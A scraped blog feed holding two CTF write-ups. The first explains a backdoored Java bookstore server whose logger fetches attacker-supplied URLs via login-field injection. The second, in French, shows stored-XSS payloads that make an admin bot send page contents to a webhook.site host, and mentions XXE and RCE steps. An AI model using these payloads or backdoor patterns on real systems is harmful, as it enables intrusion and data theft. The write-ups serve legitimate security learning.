hashed_password.equalsIgnoreCase(\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;); } static class LoginPageServer implements HttpHandler { LoginPageServer() {} @Override public void handle(HttpExchange t) throws IOException { StringBuilder response = App.ss.index_page_html; t.getResponseHeaders().add(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); t.sendResponseHeaders(200, response.toString().getBytes().length); OutputStream os = t.getResponseBody(); os.write(response.toString().getBytes()); os.close(); } } static class LandingPageServer implements HttpHandler { LandingPageServer() {} @Override public void handle(HttpExchange t) throws IOException { StringBuilder response = App.ss.landing_page_html; t.getResponseHeaders().add(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); t.sendResponseHeaders(200, response.length()); OutputStream os = t.getResponseBody(); os.write(response.toString().getBytes()); os.close(); } } static class LoginHandler implements HttpHandler { LoginHandler() {} @Override public void handle(HttpExchange t) throws IOException, UnsupportedEncodingException { String response; if (App.ss.parseRequest(t.getRequestURI().getQuery())) { response = \u0026#34;cool :)\u0026#34;; t.getResponseHeaders().add(\u0026#34;auth\u0026#34;, System.getenv(\u0026#34;WEB_COOKIE\u0026#34;)); App.ss.logger.info(\u0026#34;Authorized access!\u0026#34;); t.sendResponseHeaders(200, response.length()); } else { response = \u0026#34;sad day today for you :(\u0026#34;; App.ss.logger.warning(\u0026#34;Unauthorized access!\u0026#34;); t.sendResponseHeaders(401, response.length()); } OutputStream os = t.getResponseBody(); os.write(response.getBytes()); os.close(); } } static class BookHandler implements HttpHandler { BookHandler() {} @Override public void handle(HttpExchange t) throws IOException { StringBuilder response = App.ss.book_json; t.getResponseHeaders().add(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); t.sendResponseHeaders(200, response.toString().getBytes().length); OutputStream os = t.getResponseBody(); os.write(response.toString().getBytes()); os.close(); } } }    App.java package book.store; import book.store.Art; import book.store.LogJob; import book.store.ServerSide; public class App { static ServerSide ss; public static void main(String[] args) throws Exception { Art art = new Art(); System.out.println(); art.printTextArt(\u0026#34;HiddenBook :)\u0026#34;, 12); ss = new ServerSide(Integer.parseInt(System.getenv(\u0026#34;SERVER_PORT\u0026#34;))); LogJob lj = new LogJob(ss.getClass().getName()); lj.start(); } }    Logger.java package book.store; import book.store.App; import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.FileWriter; import java.io.IOException; import java.io.InputStreamReader; import java.net.HttpURLConnection; import java.net.URL; import java.time.LocalDateTime; import java.time.format.DateTimeFormatter; import java.util.regex.Matcher; import java.util.regex.Pattern; public class Logger { String logfile; String className; public Logger(String className) { this.className = className; this.logfile = className + \u0026#34;.log\u0026#34;; } private void writeToLogfile(String logMessage) { try { FileWriter fstream = new FileWriter(this.logfile, true); BufferedWriter out = new BufferedWriter(fstream); this.analyzeMessage(logMessage); out.write(logMessage + System.getProperty(\u0026#34;line.separator\u0026#34;)); out.close(); } catch (IOException e) { System.err.println(\u0026#34;Error: \u0026#34; + e.getMessage()); } } private void analyzeMessage(String mssg) { Pattern pattern = Pattern.compile(\u0026#34;log\\\\{.*\\\\}salt\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;)); Matcher matcher = pattern.matcher(mssg); String substring = null; if (matcher.find()) { substring = matcher.group(); } if (substring != null) { substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125)); App.ss.logger.info(substring); } pattern = Pattern.compile(\u0026#34;get\\\\{.*\\\\}salt=\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;)); matcher = pattern.matcher(mssg); substring = null; if (matcher.find()) { substring = matcher.group(); } if (substring != null) { substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125)); this.downloadFile(substring); } pattern = Pattern.compile(\u0026#34;book\\\\{.*\\\\}salt\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;)); matcher = pattern.matcher(mssg); substring = null; if (matcher.find()) { substring = matcher.group(); } if (substring != null) { substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125)); App.ss.logger.info(substring); } pattern = Pattern.compile(\u0026#34;sussy\\\\{.*\\\\}salt\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;)); matcher = pattern.matcher(mssg); substring = null; if (matcher.find()) { substring = matcher.group(); } if (substring != null) { substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125)); App.ss.logger.info(substring); } } private void downloadFile(String url) { try { String inputLine; URL link = new URL(url); link.toURI(); HttpURLConnection conn = (HttpURLConnection) link.openConnection(); conn.setRequestMethod(\u0026#34;GET\u0026#34;); conn.setRequestProperty(\u0026#34;not-found\u0026#34;, System.getenv(\u0026#34;NOT_FOUND\u0026#34;)); conn.setConnectTimeout(200); conn.setReadTimeout(200); int status = conn.getResponseCode(); if (status != 200) { return; } BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream())); StringBuffer content = new StringBuffer(); while ((inputLine = in .readLine()) != null) { content.append(inputLine); } in .close(); conn.disconnect(); } catch (Exception e) { return; } } private String returnCurrentTime() { DateTimeFormatter dtf = DateTimeFormatter.ofPattern(\u0026#34;yyyy/MM/dd HH:mm:ss\u0026#34;); LocalDateTime now = LocalDateTime.now(); return dtf.format(now); } public void error(String err_mssg) { StringBuilder sb = new StringBuilder(); String curr_time = this.returnCurrentTime(); sb.append(\u0026#34;ERROR \u0026#34;); sb.append(\u0026#34;[\u0026#34;); sb.append(curr_time); sb.append(\u0026#34;] --\u0026gt; \u0026#34;); sb.append(err_mssg); this.writeToLogfile(sb.toString()); System.err.println(sb.toString()); } public void info(String info_mssg) { StringBuilder sb = new StringBuilder(); String curr_time = this.returnCurrentTime(); sb.append(\u0026#34;INFO \u0026#34;); sb.append(\u0026#34;[\u0026#34;); sb.append(curr_time); sb.append(\u0026#34;] --\u0026gt; \u0026#34;); sb.append(info_mssg); this.writeToLogfile(sb.toString()); System.err.println(sb.toString()); } public void warning(String warn_mssg) { StringBuilder sb = new StringBuilder(); String curr_time = this.returnCurrentTime(); sb.append(\u0026#34;WARN \u0026#34;); sb.append(\u0026#34;[\u0026#34;); sb.append(curr_time); sb.append(\u0026#34;] --\u0026gt; \u0026#34;); sb.append(warn_mssg); this.writeToLogfile(sb.toString()); System.err.println(sb.toString()); } public void debug(String debug_mssg) { StringBuilder sb = new StringBuilder(); String curr_time = this.returnCurrentTime(); sb.append(\u0026#34;DEBUG \u0026#34;); sb.append(\u0026#34;[\u0026#34;); sb.append(curr_time); sb.append(\u0026#34;] --\u0026gt; \u0026#34;); sb.append(debug_mssg); this.writeToLogfile(sb.toString()); System.err.println(sb.toString()); } }    Art.java package book.store; import java.awt.Color; import java.awt.Font; import java.awt.FontMetrics; import java.awt.Graphics; import java.awt.Graphics2D; import java.awt.image.BufferedImage; public class Art { public static final int ART_SIZE_SMALL = 12; public static final int ART_SIZE_MEDIUM = 18; public static final int ART_SIZE_LARGE = 24; public static final int ART_SIZE_HUGE = 32; private static final String DEFAULT_ART_SYMBOL = \u0026#34;*\u0026#34;; public void printTextArt(String artText, int textHeight, ASCIIArtFont fontType, String artSymbol) throws Exception { String frequency = fontType.getValue(); int analysis_should_be_fun = this.findImageWidth(textHeight, artText, frequency); BufferedImage image = new BufferedImage(analysis_should_be_fun, textHeight, 1); Graphics g = image.getGraphics(); Font font = new Font(frequency, 1, textHeight); g.setFont(font); Graphics2D graphics = (Graphics2D) g; graphics.drawString(artText, 0, this.getBaselinePosition(g, font)); for (int y = 0; y \u0026lt; textHeight; ++y) { StringBuilder sb = new StringBuilder(); for (int x = 0; x \u0026lt; analysis_should_be_fun; ++x) { sb.append(image.getRGB(x, y) == Color.WHITE.getRGB() ? artSymbol : \u0026#34; \u0026#34;); } if (sb.toString().trim().isEmpty()) continue; System.out.println(sb); } } public void printTextArt(String artText, int textHeight) throws Exception { this.printTextArt(artText, textHeight, ASCIIArtFont.ART_FONT_DIALOG, DEFAULT_ART_SYMBOL); } private int findImageWidth(int textHeight, String artText, String fontName) { BufferedImage im = new BufferedImage(1, 1, 1); Graphics g = im.getGraphics(); g.setFont(new Font(fontName, 1, textHeight)); return g.getFontMetrics().stringWidth(artText); } private int getBaselinePosition(Graphics g, Font font) { FontMetrics metrics = g.getFontMetrics(font); int y = metrics.getAscent() - metrics.getDescent(); return y; } public static final class ASCIIArtFont extends Enum \u0026lt; ASCIIArtFont \u0026gt; { public static final /* enum */ ASCIIArtFont ART_FONT_DIALOG = new ASCIIArtFont(\u0026#34;Dialog\u0026#34;); public static final /* enum */ ASCIIArtFont ART_FONT_DIALOG_INPUT = new ASCIIArtFont(\u0026#34;DialogInput\u0026#34;); public static final /* enum */ ASCIIArtFont ART_FONT_MONO = new ASCIIArtFont(\u0026#34;Monospaced\u0026#34;); public static final /* enum */ ASCIIArtFont ART_FONT_SERIF = new ASCIIArtFont(\u0026#34;Serif\u0026#34;); public static final /* enum */ ASCIIArtFont ART_FONT_SANS_SERIF = new ASCIIArtFont(\u0026#34;SansSerif\u0026#34;); private String value; private static final /* synthetic */ ASCIIArtFont[] $VALUES; public static ASCIIArtFont[] values() { return (ASCIIArtFont[]) $VALUES.clone(); } public static ASCIIArtFont valueOf(String name) { return Enum.valueOf(ASCIIArtFont.class, name); } public String getValue() { return this.value; } private ASCIIArtFont(String value) { this.value = value; } private static /* synthetic */ ASCIIArtFont[] $values() { return new ASCIIArtFont[] { ART_FONT_DIALOG, ART_FONT_DIALOG_INPUT, ART_FONT_MONO, ART_FONT_SERIF, ART_FONT_SANS_SERIF }; } static { $VALUES = ASCIIArtFont.$values(); } } }  \nAfter a quick look, a piece of code catches my eye:\n// ServerSide.java line 110  public boolean parseRequest(String requestUri) throws UnsupportedEncodingException { HashMap \u0026lt; String, String \u0026gt; query_params = this.splitQuery(requestUri); String username = query_params.get(\u0026#34;username\u0026#34;); String password = query_params.get(\u0026#34;password\u0026#34;); String hashed_username = ServerSide.getMd5(username); String hashed_password = ServerSide.getMd5(password); String mssg = \u0026#34;username: \u0026#34; + username + \u0026#34;, password: \u0026#34; + password; this.logger.info(mssg); return hashed_username.equalsIgnoreCase(\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;) \u0026amp;\u0026amp; hashed_password.equalsIgnoreCase(\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;); } The function parseRequest() is used in the login phase and the hash 21232f297a57a5a743894a0e4a801fc3 corresponds to md5(admin)\nAfter login in with username=admin and password=admin we are redirected to this static page (containing 8 paragraphs ) :\nNothing interesting at first sight. From the description of the challenge it seems that the dev has left a backdoor in the code and indeed one function is suspicious in the logging system :\n// Logger.java line 80  private void downloadFile(String url) { try { String inputLine; URL link = new URL(url); link.toURI(); HttpURLConnection conn = (HttpURLConnection) link.openConnection(); conn.setRequestMethod(\u0026#34;GET\u0026#34;); conn.setRequestProperty(\u0026#34;not-found\u0026#34;, System.getenv(\u0026#34;NOT_FOUND\u0026#34;)); conn.setConnectTimeout(200); conn.setReadTimeout(200); int status = conn.getResponseCode(); if (status != 200) { return; } BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream())); StringBuffer content = new StringBuffer(); while ((inputLine = in .readLine()) != null) { content.append(inputLine); } in .close(); conn.disconnect(); } catch (Exception e) { return; } } It seems that this function (on the server side) allows to make an HTTP request to a site that we can control if we can manipulate the url parameter.\nThe only place where this function is called is just above :\n// Logger.java line 37  private void analyzeMessage(String mssg) { Pattern pattern = Pattern.compile(\u0026#34;log\\\\{.*\\\\}salt\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;)); Matcher matcher = pattern.matcher(mssg); String substring = null; if (matcher.find()) { substring = matcher.group(); } if (substring != null) { substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125)); App.ss.logger.info(substring); } pattern = Pattern.compile(\u0026#34;get\\\\{.*\\\\}salt=\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;)); matcher = pattern.matcher(mssg); substring = null; if (matcher.find()) { substring = matcher.group(); } if (substring != null) { substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125)); this.downloadFile(substring); } [...] This function is very important: we can call the backdoor downloadFile() if the mssg parameter respects the regular expression pattern :\n\u0026#34;get\\\\{.*\\\\}salt=\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;) and the parameter sent to the download() function (which will be the url of the request executed by the server) will be what is between { and }\nHowever, it is necessary to find the value of the environment variable \u0026ldquo;SALT\u0026rdquo; concatenated in the pattern (but we will see that in the next step)\nAgain, we need to be able to reach this function, and it is only called in the following function:\n// Logger.java line 25  private void writeToLogfile(String logMessage) { try { FileWriter fstream = new FileWriter(this.logfile, true); BufferedWriter out = new BufferedWriter(fstream); this.analyzeMessage(logMessage); out.write(logMessage + System.getProperty(\u0026#34;line.separator\u0026#34;)); out.close(); } catch (IOException e) { System.err.println(\u0026#34;Error: \u0026#34; + e.getMessage()); } } This function will just write the logMessage parameter to the logs and also call analyzeMessage() with this parameter.\nAgain, we need to be able to reach this function, it is called in several places, including the following function :\n// Logger.java line 132  public void info(String info_mssg) { StringBuilder sb = new StringBuilder(); String curr_time = this.returnCurrentTime(); sb.append(\u0026#34;INFO \u0026#34;); sb.append(\u0026#34;[\u0026#34;); sb.append(curr_time); sb.append(\u0026#34;] --\u0026gt; \u0026#34;); sb.append(info_mssg); this.writeToLogfile(sb.toString()); System.err.println(sb.toString()); } And finally this function is called here (which is the function called at each login attempt) :\n// ServerSide.java line 110  public boolean parseRequest(String requestUri) throws UnsupportedEncodingException { HashMap \u0026lt; String, String \u0026gt; query_params = this.splitQuery(requestUri); String username = query_params.get(\u0026#34;username\u0026#34;); String password = query_params.get(\u0026#34;password\u0026#34;); String hashed_username = ServerSide.getMd5(username); String hashed_password = ServerSide.getMd5(password); String mssg = \u0026#34;username: \u0026#34; + username + \u0026#34;, password: \u0026#34; + password; this.logger.info(mssg); return hashed_username.equalsIgnoreCase(\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;) \u0026amp;\u0026amp; hashed_password.equalsIgnoreCase(\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;); } Note that it is possible to control what is passed to the info() function because the user entries username and password are concatenated directly into the parameter.\nSo to summarise this reverse part, we have a way to make the server execute an HTTP request with the following sequence :\n Type a malicious username (maliciousUsername) It will be concatenated into the message for the logs (maliciousInput) And so the execution chain will be as follows:  this.logger.info(maliciousInput) =\u0026gt; this.writeToLogfile(maliciousInput) =\u0026gt; this.analyzeMessage(maliciousInput) =\u0026gt; this.downloadFile(maliciousInput)\nHowever, the hardest part remains: finding the SALT in order to match the following pattern and reach the backdoor\n\u0026#34;get\\\\{.*\\\\}salt=\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;) Find SALT This is the longest part and where you had to guess how the SALT was generated. After long hours of research and reading each line of code, two lines of code caught my attention because they were outside the logic of variable naming encountered so far :\n// Art.java line 17 public void printTextArt(String artText, int textHeight, ASCIIArtFont fontType, String artSymbol) throws Exception { String frequency = fontType.getValue(); int analysis_should_be_fun = this.findImageWidth(textHeight, artText, frequency); [...] \u0026ldquo;frequency analysis_should_be_fun\u0026rdquo;.\nDespairing, I say to myself that it would not be impossible for the SALT to be for each letter, the one that appears the most respectively in the 8 paragraphs (because the challenge index indicated that there were 8 letters in the SALT)\nSo after calculating the frequency of appearance (respecting the case) of the letters in each paragraph, the following SALT is obtained:\nWe now have everything we need to run the backdoor\nUse backdoor inside source code For this step we just have to login with the following payload for the username or password\nWhen authenticating, this is what will happen:\n Our username will be concatenated with text for the log files   The execution chain will be as follows:  this.logger.info(maliciousInput) =\u0026gt; this.writeToLogfile(maliciousInput) =\u0026gt; this.analyzeMessage(maliciousInput)\n analyzeMessage(maliciousInput) will match the following pattern and extract what is between { and } and send it as a parameter to the downloadFile() function :  \u0026#34;get\\\\{.*\\\\}salt=\u0026#34; + System.getenv(\u0026#34;SALT\u0026#34;) • this.downloadFile(maliciousInput) sends a request to https://XXXXXXXXX.x.pipedream.netFLAG : dctf{L0g_4_hid3n_d@7@_n0t_s0_h@rd_righ7}\n","date":"2022-04-18T00:00:00Z","image":"https://endeavxor.github.io/p/dctf-2022-bookstore.java/cover.jpg","permalink":"https://endeavxor.github.io/p/dctf-2022-bookstore.java/","title":"DCTF 2022 - BookStore.java"},{"content":"TLDR  XSRF afin de forcer le bot de maintenance à nous afficher du contenu inaccessible LFI via XXE sur un .docx RCE via création d\u0026rsquo;un fichier PHP sur le serveur  HR-Panel 1 - 150pts Découverte du site Lorsque l\u0026rsquo;on arrive sur le site, nous sommes face à une page classique avec la possibilité de s\u0026rsquo;inscrire puis de se connecter.\nUn premier réflexe est de regarder dans le fichier robots.txt à la racine du site.\nOn y découvre un fichier intéressant qui ne doit pas être pris en charge par les web crawlers de Google : .htaccess En tentant d\u0026rsquo;y accéder directement, on observe que la ressource existe bel et bien mais que nous ne sommes pas autorisés à y accéder.\nAprès quelques tests infructueux sur des failles classiques sur la partie du login (SQLi etc \u0026hellip;), on décide de simplement créer un compte (on remarque dans le code source des restrictions sur la syntaxe du mail \u0026ldquo;*@inter-iut.fr\u0026rdquo; et de l\u0026rsquo;ID \u0026ldquo;[A-Z][0-9]-[0-9]{3}-[A-Z]{2}\u0026quot;)\nOn y aperçoit 3 nouveaux liens dans le menu du haut :\n Services (Inaccessible pour le moment depuis notre compte) My account (Qui liste les informations du compte avec la possibilité de changer de mot de passe) Contact (Un formulaire de contact qui permet de demander de l\u0026rsquo;aide)  Il est alors judicieux d\u0026rsquo;aller investiguer cette fameuse fonctionnalité permettant de contacter quelqu\u0026rsquo;un. Le premier réflexe est de tester si le message envoyé est traité côté serveur afin de supprimer des éventuelles balises de script qui pourront exécuter du Javascript. On teste donc la payload suivante qui, si elle fonctionne redirigera la personne qui lit ce message sur notre site.\n\u0026lt;script\u0026gt;document.location=\u0026#34;https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd\u0026#34;\u0026lt;/script\u0026gt; Après quelques secondes on reçoit bien une requête sur notre site, indiquant la validité d\u0026rsquo;une faille XSS sur la page de contact.\nExploitation de la faille XSS La suite logique de cette faille va être de forcer l\u0026rsquo;entité qui lit notre message (en l\u0026rsquo;occurrence un bot au vu de l\u0026rsquo;header REFERER reçu dans la réponse de la requête) à réaliser des actions à notre place, en espérant qu\u0026rsquo;elle dispose de plus de privilèges que nous. Ce que l\u0026rsquo;on souhaiterait dans un premier temps c\u0026rsquo;est d\u0026rsquo;accéder au contenu de la page /services . On va donc utiliser la payload suivante afin de forcer le bot à récupérer son contenu, l\u0026rsquo;encoder en base64 puis l\u0026rsquo;envoyer sur notre site.\n\u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#39;GET\u0026#39;,\u0026#39;/services\u0026#39;,false); xhr.send(); document.location=\u0026#34;https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd/?content=\u0026#34;.concat(btoa(btoa(xhr.responseText))); \u0026lt;/script\u0026gt; ( Pour ce writeup vous noterons le double encodage en base64, ce n\u0026rsquo;est pas quelquechose que j\u0026rsquo;avais utilisé lors du CTF puisque je passait directement sur mon VPS, mais pour une raison que j\u0026rsquo;ignore encore c\u0026rsquo;est le seul moyen de récupèrer sur le site les données sans problème)\nAprès quelques secondes, nous recevons une magnifique requete avec beaucoup de contenu en base64, il s\u0026rsquo;agit en faite de la page /services, après double décodage on obtient :\n Page /services double encodé en base64 UENGRVQwTlVXVkJGSUVoVVRVdytDanhvWldGa1Bnb2dJQ0FnUEhScGRHeGxQa2x1ZEdWeUlFbFZWQ0F0SUVoMWJXRnVJRkpsYzI5MWNtTmxjend2ZEdsMGJHVStDaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStDaUFnSUNBOGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUltaDBkSEJ6T2k4dmMzUmhZMnR3WVhSb0xtSnZiM1J6ZEhKaGNHTmtiaTVqYjIwdlltOXZkSE4wY21Gd0x6UXVNeTR4TDJOemN5OWliMjkwYzNSeVlYQXViV2x1TG1OemN5SWdhVzUwWldkeWFYUjVQU0p6YUdFek9EUXRaMmRQZVZJd2FWaERZazFSZGpOWWFYQnRZVE0wVFVRclpFZ3ZNV1pSTnpnMEwybzJZMWt2YVVwVVVWVlBhR05YY2pkNE9VcDJiMUo0VkRKTlduY3hWQ0lnWTNKdmMzTnZjbWxuYVc0OUltRnViMjU1Ylc5MWN5SStDaUFnSUNBOGMyTnlhWEIwSUhOeVl6MGlhSFIwY0hNNkx5OWpiMlJsTG1weGRXVnllUzVqYjIwdmFuRjFaWEo1TFRNdU15NHhMbk5zYVcwdWJXbHVMbXB6SWlCcGJuUmxaM0pwZEhrOUluTm9ZVE00TkMxeE9Ha3ZXQ3M1TmpWRWVrOHdjbFEzWVdKTE5ERktVM1JSU1VGeFZtZFNWbnB3WW5wdk5YTnRXRXR3TkZsbVVuWklLemhoWW5SVVJURlFhVFpxYVhwdklpQmpjbTl6YzI5eWFXZHBiajBpWVc1dmJubHRiM1Z6SWo0OEwzTmpjbWx3ZEQ0S0lDQWdJRHh6WTNKcGNIUWdjM0pqUFNKb2RIUndjem92TDJOa2JtcHpMbU5zYjNWa1pteGhjbVV1WTI5dEwyRnFZWGd2YkdsaWN5OXdiM0J3WlhJdWFuTXZNUzR4TkM0M0wzVnRaQzl3YjNCd1pYSXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMVZUekpsVkRCRGNFaHhaRk5LVVRab1NuUjVOVXRXY0doMFVHaDZWMm81VjA4eFkyeElWRTFIWVROS1JGcDNjbTVSY1RSelJqZzJaRWxJVGtSNk1GY3hJaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnYzNKalBTSm9kSFJ3Y3pvdkwzTjBZV05yY0dGMGFDNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMak11TVM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMUthbE50Vm1kNVpEQndNM0JZUWpGeVVtbGlXbFZCV1c5SlNYazJUM0pSTmxaeWFrbEZZVVptTDI1S1IzcEplRVpFYzJZMGVEQjRTVTByUWpBM2FsSk5JaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtQQzlvWldGa1BnbzhZbTlrZVQ0OGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUlpOWhjM05sZEhNdlkzTnpMMlp2Y20wdVkzTnpJajRLUEc1aGRpQmpiR0Z6Y3owaWJtRjJZbUZ5SUc1aGRtSmhjaTFsZUhCaGJtUXRiR2NnYm1GMlltRnlMV3hwWjJoMElHSm5MV3hwWjJnaVBnb2dJRHhoSUdOc1lYTnpQU0p1WVhaaVlYSXRZbkpoYm1RaUlHaHlaV1k5SWk4aVBnb2dJQ0FnUEdsdFp5QnpjbU05SWk5aGMzTmxkSE12U1cxaFoyVnpMMnh2WjI4dWNHNW5JaUIzYVdSMGFEMGlORFVpSUdobGFXZG9kRDBpTkRBaUlHTnNZWE56UFNKa0xXbHViR2x1WlMxaWJHOWpheUJoYkdsbmJpMTBiM0FpSUdGc2REMGlJajRLSUNBZ0lFbHVkR1Z5SUVsVlZBb2dJRHd2WVQ0S0lDQThaR2wySUdOc1lYTnpQU0pqYjJ4c1lYQnpaU0J1WVhaaVlYSXRZMjlzYkdGd2MyVWlJR2xrUFNKdVlYWmlZWEpPWVhaQmJIUk5ZWEpyZFhBaVBnb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaWJtRjJZbUZ5TFc1aGRpSStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZJajVJYjIxbFBDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUlnYUhKbFpqMGlMMkZrYldsdUwzVnpaWEp6SWo1QlpHMXBiand2WVQ0Z0lDQWdJQ0FnSUR4aElHTnNZWE56UFNKdVlYWXRhWFJsYlNCdVlYWXRiR2x1YXlCaFkzUnBkbVVpSUdoeVpXWTlJaTl6WlhKMmFXTmxjeUkrVTJWeWRtbGpaWE1nSUR4emNHRnVJR05zWVhOelBTSnpjaTF2Ym14NUlqNG9ZM1Z5Y21WdWRDazhMM053WVc0K1BDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUlnYUhKbFpqMGlMMk52Ym5SaFkzUWlQa052Ym5SaFkzUThMMkUrQ2lBZ0lDQWdJQ0FnUEdFZ1kyeGhjM005SW01aGRpMXBkR1Z0SUc1aGRpMXNhVzVySWlCb2NtVm1QU0l2YldVaVBrMTVJR0ZqWTI5MWJuUThMMkUrSUNBS0lDQWdJQ0FnSUNBOFlTQmpiR0Z6Y3owaWJtRjJMV2wwWlcwZ2JtRjJMV3hwYm1zaUlHaHlaV1k5SWk5c2IyZHZkWFFpUGt4dloyOTFkRHd2WVQ0S0lDQWdJRHd2WkdsMlBnb2dJRHd2WkdsMlBnbzhMMjVoZGo0S0lDQWdJQW9nSUNBZ1BHUnBkaUJqYkdGemN6MGlZMjl1ZEdGcGJtVnlJajRLSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKeWIzY2lQZ29nSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMndnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BIQWdZMnhoYzNNOUlteGxZV1FpSUhOMGVXeGxQU0p0WVhKbmFXNHRkRzl3T2lBeU1IQjRPeUJqYjJ4dmNqb2dZbXhoWTJzN0lqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JJWld4c2J5QnlhRjloWkcxcGJsOXpaWEoyYVdObExDQjNhR2xqYUNCelpYSjJhV05sY3lCM2IzVnNaQ0I1YjNVZ2JHbHJaU0IwYnlCMWMyVS9JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZjRDRnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThhSEl2UGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEdScGRpQmpiR0Z6Y3owaWNtOTNJajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMnd0YzIwdE5DSStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpZWEprSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSXpVeU9XSmpNRHNpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtMV0p2WkhraVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG9OU0JqYkdGemN6MGlZMkZ5WkMxMGFYUnNaU0krUVdOalpYTnpJRzE1SUhCaGVTQnpiR2x3Y3p3dmFEVStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbU5oY21RdGRHVjRkQ0krUEdKeVBqeGlkWFIwYjI0Z1kyeGhjM005SW1KMGJpQmlkRzR0Y0hKcGJXRnllU0lnYjI1amJHbGphejBpWkc5amRXMWxiblF1Ykc5allYUnBiMjQ5Snk5elpYSjJhV05sY3k5emJHbHdjeWNpUGtGalkyVnpjend2WW5WMGRHOXVQand2Y0Q0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEM5a2FYWStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMnd0YzIwdE5DSStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpZWEprSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSXpVeU9XSmpNRHNpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtMV0p2WkhraVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG9OU0JqYkdGemN6MGlZMkZ5WkMxMGFYUnNaU0krVFdGdVlXZGxJRzE1SUhaaFkyRjBhVzl1Y3p3dmFEVStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbU5oY21RdGRHVjRkQ0krUEdKeVBqeGlkWFIwYjI0Z1kyeGhjM005SW1KMGJpQmlkRzR0Y0hKcGJXRnllU0lnYjI1amJHbGphejBpWkc5amRXMWxiblF1Ykc5allYUnBiMjQ5Snk5elpYSjJhV05sY3k5MllXTmhkR2x2Ym5NbklqNUJZMk5sYzNNOEwySjFkSFJ2Ymo0OEwzQStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ